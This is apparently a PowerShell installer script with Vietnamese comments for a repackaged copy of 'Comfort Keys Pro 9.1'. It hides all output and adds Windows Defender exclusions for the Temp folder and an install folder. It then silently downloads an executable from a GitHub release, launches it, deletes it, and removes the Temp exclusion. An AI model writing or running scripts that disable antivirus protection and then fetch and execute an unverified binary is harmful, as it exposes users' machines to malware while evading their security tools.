# Ẩn tất cả output
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'

# Thêm exclusions (không hiển thị thông tin)
Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force
Add-MpPreference -ExclusionPath "C:\Comfort Keys Pro 9.1 by MMT Windows Tech" -Force

# Đường dẫn tải file
$downloadUrl = "https://github.com/ghostminhtoan/private/releases/download/MMT/Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"
$tempPath = [System.IO.Path]::GetTempPath()
$downloadPath = Join-Path $tempPath "Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe"

# Tải file
Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -UseBasicParsing

# Chạy file cài đặt và không đợi kết thúc
Start-Process -FilePath $downloadPath

# Đợi 5 giây
Start-Sleep -Seconds 5

# Xóa file tải về
if (Test-Path $downloadPath) {
    Remove-Item -Path $downloadPath -Force
}

# Xóa exclusion cho Temp
Remove-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp" -Force

# Kiểm tra xem exclusion cho Temp còn tồn tại không
$exclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
$tempExclusion = "$env:USERPROFILE\AppData\Local\Temp"

if ($exclusions -contains $tempExclusion) {
    # Nếu còn, thử xóa lại
    Remove-MpPreference -ExclusionPath $tempExclusion -Force
}

# Thoát PowerShell
exit
